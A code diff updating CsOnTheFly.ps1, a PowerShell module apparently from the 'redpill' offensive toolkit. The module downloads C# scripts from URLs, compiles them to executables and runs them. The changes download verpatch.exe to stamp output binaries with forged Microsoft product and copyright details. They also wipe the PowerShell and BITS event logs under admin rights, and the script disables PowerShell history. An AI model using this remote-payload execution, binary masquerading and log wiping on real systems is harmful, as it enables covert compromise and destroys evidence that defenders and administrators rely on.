@@ -6,15 +6,15 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: Microsoft.NET {native}
    Optional Dependencies: BitsTransfer {native}
-   PS cmdlet Dev version: v1.0.5
+   PS cmdlet Dev version: v1.2.6
 
 .DESCRIPTION
    This CmdLet downloads\compiles script.cs (To exe) and executes the binary.
 
 .NOTES
-   This CmdLet allows users to Download script.cs from user input -URI [ URL ]
-   into -OutFile [ absoluct\path\filename.exe ] directory OR simple to compile
-   an Local script.cs into a standalone executable before execute him.
+   This cmdlet allow users to download CS scripts from network [ -Uri http://Script.cs ]
+   Or simple to compile an Local CS script into a standalone executable and execute him!
+   Remark: Compiling CS scripts using this module will not bypass in any way AV detection.
 
 .Parameter Action
    Accepts arguments: Compile, Execute (default: Execute)
@@ -23,10 +23,13 @@
    Script.cs URL to be downloaded OR Local script.cs absoluct \ relative path
 
 .Parameter OutFile
-   Standalone executable name plus is absoluct \ relative path
+   Standalone executable to be created name plus is absoluct \ relative path
 
 .Parameter IconSet
    Accepts arguments: True or False (default: False)
+
+.Parameter FileDescription
+   The Compiled standalone executable file description
 
 .EXAMPLE
    PS C:\> Get-Help .\CsOnTheFly.ps1 -full
@@ -38,13 +41,13 @@
 
 .EXAMPLE
    PS C:\> .\CsOnTheFly.ps1 -Action Execute -IconSet True
-   Create demonstration script.cs \ compile it to binary.exe add
-   redpill icon to standalone executable compiled and execute him!
+   Create demonstration script.cs \ compile it to binary.exe and add
+   redpill icon.ico to compiled standalone executable and execute him!
    Remark: Adding a icon to our executable migth trigger AV detection!
 
 .EXAMPLE
    PS C:\> .\CsOnTheFly.ps1 -Action Compile -Uri "calc.cs" -OutFile "out.exe"
-   Compiles Local -Uri [ calc.cs ] into an standalone executable (dont-execute)
+   Compiles Local -Uri [ calc.cs ] into an standalone executable (dont-execute-exe)
 
 .EXAMPLE
    PS C:\> .\CsOnTheFly.ps1 -Action Execute -Uri "calc.cs" -OutFile "out.exe"
@@ -53,7 +56,7 @@
 .EXAMPLE
    PS C:\> .\CsOnTheFly.ps1 -Action Execute -Uri "https://raw.github.com/../calc.cs" -OutFile "$Env:TMP\out.exe"
    Downloads -Uri [ URL ] compiles the cs script into an standalone executable and executes the resulting binary.
-   Remark: Downloading script.CS from network (https://) will mandatory download it to %tmp% directory!
+   Remark: Downloading script.CS from network (https://) will mandatory download them to %tmp% directory!
 
 .INPUTS
    None. You cannot pipe objects into CsOnTheFly.ps1
@@ -61,22 +64,24 @@
 .OUTPUTS
    Compiling SpawnPowershell.cs On-The-Fly!
    ----------------------------------------
-   Microsoft.NET : 4.8.03752
-   NETCompiler   : C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
-   Uri           : C:\Users\pedro\AppData\Local\Temp\SpawnPowershell.cs
-   OutFile       : C:\Users\pedro\AppData\Local\Temp\Installer.exe
-   Action        : Execute
-   ApplIcon?     : False
-   Compiled?     : True
+   Microsoft.NET   : 4.8.03752
+   NETCompiler     : C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
+   Uri             : https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/SpawnPowershell.cs
+   OutFile         : C:\Users\pedro\AppData\Local\Temp\Installer.exe
+   FileDescription : @redpill CS Compiled Executable
+   Action          : Execute
+   ApplIcon?       : False
+   Compiled?       : True
 
-   Directory                         Name          CreationTime       
-   ---------                         ----          ------------       
-   C:\Users\pedro\AppData\Local\Temp Installer.exe 06/04/2021 15:55:40
+   Directory                         Name          Length CreationTime       
+   ---------                         ----          ------ ------------       
+   C:\Users\pedro\AppData\Local\Temp Installer.exe   4096 06/04/2021 15:55:40
 #>
 
 
 ## Non-Positional cmdlet named parameters
 [CmdletBinding(PositionalBinding=$false)] param(
+   [string]$FileDescription="@redpill CS Compiled Executable",
    [string]$Uri="$Env:TMP\SpawnPowershell.cs",
    [string]$OutFile="$Env:TMP\Installer.exe",
    [string]$Action="Execute",
@@ -85,6 +90,7 @@
 
 
 $ORIGINALURL = $null
+$cmdletversion = "1.2.6"
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 $Working_Directory = pwd|Select-Object -ExpandProperty Path
@@ -101,9 +107,10 @@ $IconFile = "$StrInput" + "myicon.ico" -Join ''            ## C:\Users\pedro\App
 
 
 ## Creates demonstration CS script in the case
-# of -URI [ script.cs ] user input is not found!
+# of -URI [ script.cs ] user input its NOT found!
 $PSInstallPath = $PsHome ## Store PowerShell path!
-$RawCSScript = @("/*
+$RawCSScript = @("
+/*
    Author: @r00t-3xp10it
    redpill v1.2.6 - CsOnTheFly Internal Module!
 */
@@ -136,7 +143,10 @@ If($Action -ieq "Compile" -or $Action -ieq "Execute"){
       PS C:\> .\CsOnTheFly.ps1 -Action Compile -Uri "calc.cs" -OutFile "out.exe"
 
    .EXAMPLE
-      PS C:\> .\CsOnTheFly.ps1 -Action Execute -Uri "calc.cs" -OutFile "out.exe" -IconSet True
+      PS C:\> .\CsOnTheFly.ps1 -Action Compile -Uri "calc.cs" -OutFile "out.exe" -IconSet True
+
+   .EXAMPLE
+      PS C:\> .\CsOnTheFly.ps1 -Action Execute -Uri "calc.cs" -OutFile "out.exe" -FileDescription "myapplication"
 
    .EXAMPLE
       PS C:\> .\CsOnTheFly.ps1 -Action Execute -Uri "https://raw.github.com/../calc.cs" -OutFile "$Env:TMP\out.exe"
@@ -144,17 +154,18 @@ If($Action -ieq "Compile" -or $Action -ieq "Execute"){
    .OUTPUTS
       Compiling SpawnPowershell.cs On-The-Fly!
       ----------------------------------------
-      Microsoft.NET : 4.8.03752
-      NETCompiler   : C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
-      Uri           : https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/SpawnPowershell.cs
-      OutFile       : C:\Users\pedro\AppData\Local\Temp\Intaller.exe
-      Action        : Execute
-      ApplIcon?     : False
-      Compiled?     : True
+      Microsoft.NET   : 4.8.03752
+      NETCompiler     : C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
+      Uri             : https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/SpawnPowershell.cs
+      OutFile         : C:\Users\pedro\AppData\Local\Temp\Intaller.exe
+      FileDescription : @redpill CS Compiled Executable
+      Action          : Execute
+      ApplIcon?       : False
+      Compiled?       : True
 
-      Directory                         Name          CreationTime       
-      ---------                         ----          ------------       
-      C:\Users\pedro\AppData\Local\Temp Installer.exe 06/04/2021 15:55:40
+      Directory                         Name          Length CreationTime       
+      ---------                         ----          ------ ------------       
+      C:\Users\pedro\AppData\Local\Temp Installer.exe   4096 06/04/2021 15:55:40
    #>
 
 
@@ -242,7 +253,7 @@ If($Action -ieq "Compile" -or $Action -ieq "Execute"){
 
    }Else{## [error] Microsoft.NET framework not found!
    
-      Write-Host "[error] Not found: csc.exe (Microsoft.NET)!`n`n" -ForegroundColor Red -BackgroundColor Black
+      Write-Host "[error] Microsoft.NET Compiler (csc.exe) not found!`n`n" -ForegroundColor Red -BackgroundColor Black
       exit ## Exit @Compilecs
    
    }
@@ -256,7 +267,43 @@ If($Action -ieq "Compile" -or $Action -ieq "Execute"){
    }Else{## Fail to compile CS to binary
 
       $RawErrorName = $OutFile.Split('\\')[-1]
-      $CompileState = "Fail to create $RawErrorName!"
+      $CompileState = "Fail to create '$RawErrorName'!"
+
+   }
+
+
+   <#
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Helper - Change Standalone executable description!
+
+   .NOTES
+      Required dependencies: Bits-Transfer
+      Required dependencies: verpatch.exe
+
+   .OUTPUTS
+      FileVersion : 1.2.6
+      FileName    : Intaller.exe
+      Description : @redpill CS Compiled Executable
+      ProductName : Microsoft® Windows® Operative System
+      Copyright   : ©Microsoft Corporation. All Rights Reserved
+   #>
+
+   ## Download verpatch.exe from PandoraBox repository!
+   If(-not(Test-Path -Path "verpatch.exe" -ErrorAction SilentlyContinue)){
+      Start-BitsTransfer -priority foreground -Source "https://raw.githubusercontent.com/r00t-3xp10it/PandoraBox/master/PandoraBox/FileDescription/verpatch.exe" -Destination "verpatch.exe" -ErrorAction SilentlyContinue|Out-Null
+   }
+
+   $ProDuctName = $OutFile.Split('\\')[-1]
+   ## Change Compiled Standalone executable file description!
+   Write-Host "[info:] Modify '$ProDuctName' file description!" -ForegroundColor Yellow
+   If(Test-Path -Path "verpatch.exe" -ErrorAction SilentlyContinue){
+
+      .\verpatch.exe /va "$OutFile" "$cmdletversion" /s desc "$FileDescription" /s pb "$cmdletversion" /s product "Microsoft Windows Operative System" /pv "$cmdletversion" /s copyright "Microsoft Corporation. All Rights Reserved" /s OriginalFilename "$ProDuctName"
+
+   }Else{## [error] fail to download verpatch.exe!
+   
+      Write-Host "[error] fail to download verpatch.exe!" -ForegroundColor Red -BackgroundColor Black
 
    }
 
@@ -284,6 +331,7 @@ If($Action -ieq "Compile" -or $Action -ieq "Execute"){
    $mytable.Columns.Add("NETCompiler")|Out-Null
    $mytable.Columns.Add("Uri")|Out-Null
    $mytable.Columns.Add("OutFile")|Out-Null
+   $mytable.Columns.Add("FileDescription")|Out-Null
    $mytable.Columns.Add("Action")|Out-Null
    $mytable.Columns.Add("ApplIcon?")|Out-Null
    $mytable.Columns.Add("Compiled?")|Out-Null
@@ -291,6 +339,7 @@ If($Action -ieq "Compile" -or $Action -ieq "Execute"){
                      "$LocalCSPath",
                      "$Uri",          ## <- Accepts: ( http:// | C:\windows | calc.cs ) Path's
                      "$OutFile",
+                     "$FileDescription",
                      "$Action",
                      "$IconSet",
                      "$CompileState")|Out-Null
@@ -303,7 +352,7 @@ If($Action -ieq "Compile" -or $Action -ieq "Execute"){
    ## Display standalone executable state { Get-ChildItem }
    If(Test-Path -Path "$OutFile" -ErrorAction SilentlyContinue){
       Get-ChildItem -Path "$OutFile" -ErrorAction SilentlyContinue |
-         Select-Object Directory,Name,CreationTime | Format-Table -AutoSize
+         Select-Object Directory,Name,Length,CreationTime | Format-Table -AutoSize
    }
 
    If($Action -ieq "Execute"){
@@ -329,17 +378,38 @@ If($Action -ieq "Compile" -or $Action -ieq "Execute"){
 .NOTES
    This function will delete Bits-Transfer logfiles from eventvwr
    SnapIn if CsOnTheFly its executed with Administrator privileges!
+   By default it only deletes @CsOnTheFly cmdlet artifacts left behind! 
 #>
 
 If(Test-Path -Path "$Env:TMP\OutputTable.log" -EA SilentlyContinue){
    Remove-Item -Path "$Env:TMP\OutputTable.log" -Force
 }
+If(Test-Path -Path "verpatch.exe" -EA SilentlyContinue){
+   Remove-Item -Path "verpatch.exe" -Force
+}
 If(Test-Path -Path "$IconFile" -EA SilentlyContinue){
    Remove-Item -Path "$IconFile" -Force
 }
 
+## Administrator Privileges cleanning!
 $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
-If($IsClientAdmin){## Clean ALL BITS-TRANSFER logfiles!
-   ## Bits Log: Microsoft-Windows-BITS-Client/Operational log.evtx
-   wevtutil cl "Microsoft-Windows-Bits-Client/Operational"
+If($IsClientAdmin){## Clean related eventvwr logfiles
+
+   $CleanPS = (wevtutil gli "Microsoft-Windows-Powershell/Operational" | Where-Object { 
+      $_ -Match 'numberOfLogRecords:' }).split(':')[1] -replace ' ',''
+
+   If($CleanPS -gt 0){## Delete ALL Powershell LogFiles
+      Write-Host "[+] Eventvwr Powershell/Operational Logs Deleted!" -ForeGroundColor Yellow
+      wevtutil cl "Microsoft-Windows-Powershell/Operational" | Out-Null
+   }
+
+   $CleanBT = (wevtutil gli "Microsoft-Windows-Bits-Client/Operational" | Where-Object { 
+      $_ -Match 'numberOfLogRecords:' }).split(':')[1] -replace ' ',''
+
+   If($CleanBT -gt 0){## Delete ALL Bits-Transfer LogFiles
+      Write-Host "[+] Eventvwr Bits-Client/Operational Logs Deleted!" -ForeGroundColor Yellow
+      wevtutil cl "Microsoft-Windows-Bits-Client/Operational" | Out-Null
+   }
+
 }
+Write-Host ""
